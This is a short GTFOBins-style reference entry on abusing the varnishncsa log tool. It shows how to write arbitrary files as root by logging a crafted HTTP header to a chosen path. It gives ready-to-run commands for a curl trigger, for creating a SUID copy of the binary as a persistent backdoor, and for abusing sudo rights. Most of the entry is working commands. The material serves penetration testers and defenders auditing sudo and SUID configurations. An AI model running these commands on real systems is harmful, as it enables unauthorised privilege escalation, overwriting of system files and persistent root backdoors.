# GTFOBin: varnishncsa

This allows to write arbitrary files as root, provided that the proper HTTP response is made. Specifically the content of a certain header will be written in the file. First start `varnishncsa` as follows, then trigger the file write with:

```
curl -H 'yyy: DATA' http://localhost:6081/xxx

```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which varnishncsa) .

LFILE=file_to_write
./varnishncsa -g request -q 'ReqURL ~ "/xxx"' -F '%{yyy}i' -w "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=file_to_write
sudo varnishncsa -g request -q 'ReqURL ~ "/xxx"' -F '%{yyy}i' -w "$LFILE"
```